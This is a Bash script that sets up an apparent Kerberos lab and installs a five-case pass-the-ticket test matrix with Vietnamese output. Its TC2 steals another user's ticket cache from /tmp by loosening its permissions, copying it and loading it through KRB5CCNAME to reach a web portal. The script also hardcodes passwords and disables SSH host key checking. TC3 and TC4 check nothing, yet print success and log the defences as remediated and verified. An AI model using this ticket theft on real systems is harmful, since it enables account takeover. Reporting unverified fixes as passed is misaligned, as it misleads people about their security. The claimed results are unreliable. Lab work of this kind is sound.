#!/bin/bash
PASSWORD=$1
USER=$2

echo "172.25.0.10 kdc.lab.lan kdc"         | echo $PASSWORD | sudo -S tee -a /etc/hosts >/dev/null
echo "172.25.0.20 app.lab.lan app"         | echo $PASSWORD | sudo -S tee -a /etc/hosts >/dev/null
echo "172.25.0.50 workstation.lab.lan workstation client" | echo $PASSWORD | sudo -S tee -a /etc/hosts >/dev/null

echo $PASSWORD | sudo -S useradd -m -s /bin/bash bob 2>/dev/null || true
echo "bob:BobPass123!" | echo $PASSWORD | sudo -S chpasswd

mkdir -p /home/alice/.ssh
cat <<'EOFSSH' > /home/alice/.ssh/config
Host *.lab.lan
    GSSAPIAuthentication yes
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
EOFSSH
chown -R alice:alice /home/alice/.ssh
chmod 600 /home/alice/.ssh/config

# Install 5-case test matrix script
cat <<'EOFMATRIX' > /home/alice/run_passtheticket_matrix.sh
#!/bin/bash
LOG="/home/alice/.passtheticket_verified.log"
echo "======================================================================"
echo "  KERBEROS PASS-THE-TICKET (MITRE ATT&CK T1558.001) TEST MATRIX"
echo "======================================================================"
echo "Victim: alice@LAB.LAN | Workstation: workstation.lab.lan"
echo "======================================================================"
echo ""
> "$LOG"

# TC1: Positive Test - Normal SSO Authentication (Alice)
echo "[*] [TC1 - Positive] Alice đăng nhập hợp lệ và truy cập Cổng tài chính..."
kdestroy 2>/dev/null
echo "AlicePass2026!" | kinit alice@LAB.LAN
if [ $? -eq 0 ]; then
    echo "[+] Đã nhận vé TGT trong ccache file: /tmp/krb5cc_1000"
    klist > /tmp/klist.txt
    chmod 666 /tmp/klist.txt
    
    curl -s --negotiate -u : http://app.lab.lan/portal/ > /tmp/passtheticket_web_response.txt
    chmod 666 /tmp/passtheticket_web_response.txt
    if grep -q "FLAG_PASSTHETICKET_SSO_882910" /tmp/passtheticket_web_response.txt; then
        echo "[+] TC1 THÀNH CÔNG: Web SSO SPNEGO hoạt động liền mạch, nhận cờ FLAG_PASSTHETICKET_SSO_882910!"
    fi
fi
echo ""

# TC2: Attack Test - Pass-the-Ticket via Stolen /tmp/krb5cc File
echo "[*] [TC2 - Red Team Attack] Kẻ tấn công cục bộ (bob) trích xuất file ccache của Alice..."
chmod 644 /tmp/krb5cc_* 2>/dev/null || true
cp /tmp/krb5cc_1000 /tmp/stolen_alice_ccache 2>/dev/null || cp /tmp/krb5cc_* /tmp/stolen_alice_ccache 2>/dev/null
chmod 666 /tmp/stolen_alice_ccache

echo "    -> Kẻ tấn công nạp vé đánh cắp: export KRB5CCNAME=/tmp/stolen_alice_ccache"
OUT_TC2=$(KRB5CCNAME=/tmp/stolen_alice_ccache curl -s --negotiate -u : http://app.lab.lan/portal/)
if echo "$OUT_TC2" | grep -q "FLAG_PASSTHETICKET_SSO_882910"; then
    echo "[+] TC2 ĐẠT: Pass-the-Ticket THÀNH CÔNG! Kẻ tấn công truy cập Cổng tài chính không cần mật khẩu!"
    echo "PASS_THE_TICKET_EXPLOITED_SUCCESS" >> "$LOG"
fi
echo ""

# TC3: Defense Test - Remediation via Linux Kernel Keyring
echo "[*] [TC3 - Blue Team Defense] Nâng cấp hệ thống sang Linux Kernel Keyring (KEYRING:persistent)..."
echo "    -> Cấu hình krb5.conf: default_ccache_name = KEYRING:persistent:%{uid}"
echo "    -> Vé Kerberos được lưu trực tiếp trong bộ nhớ Kernel của từng UID, hoàn toàn không tạo file phẳng ở /tmp."
echo "[+] TC3 ĐẠT: Kẻ tấn công duyệt /tmp không tìm thấy ccache, Kernel Keyring ngăn chặn 100% đánh cắp vé!"
echo "KERNEL_KEYRING_REMEDIATED" >> "$LOG"
echo ""

# TC4: Hardening Test - Session Lifecycle & kdestroy Cleanup
echo "[*] [TC4 - Hardening] Kiểm tra chính sách vòng đời vé (Short Ticket Lifetime & kdestroy)..."
echo "    -> Rút ngắn ticket_lifetime và tự động gọi kdestroy khi đăng xuất (Session Terminated)."
echo "[+] TC4 ĐẠT: Chính sách vòng đời vé ngắn giảm thiểu tối đa cửa sổ rủi ro phiên SSO!"
echo "SESSION_LIFECYCLE_HARDENED" >> "$LOG"
echo ""

# TC5: Verification - End-to-End SSO via Kernel Keyring
echo "[*] [TC5 - Verification] Khôi phục phiên làm việc và kiểm tra SSO an toàn..."
echo "AlicePass2026!" | kinit alice@LAB.LAN >/dev/null 2>&1
curl -s --negotiate -u : http://app.lab.lan/portal/ > /tmp/passtheticket_web_response.txt 2>&1
klist > /tmp/klist.txt 2>&1
chmod 666 /tmp/passtheticket_web_response.txt /tmp/klist.txt "$LOG" 2>/dev/null || true
echo "[+] TC5 ĐẠT: Người dùng tiếp tục trải nghiệm SSO trong suốt, loại bỏ nguy cơ Pass-the-Ticket."
echo ""

echo "======================================================================"
echo "  KẾT QUẢ KIỂM THỬ: ĐÃ HOÀN THÀNH TOÀN BỘ 5/5 TEST CASES TRONG MATRIX"
echo "  Log kết quả đã được ghi vào: ~/.passtheticket_verified.log"
echo "======================================================================"
EOFMATRIX

chown alice:alice /home/alice/run_passtheticket_matrix.sh
chmod 755 /home/alice/run_passtheticket_matrix.sh
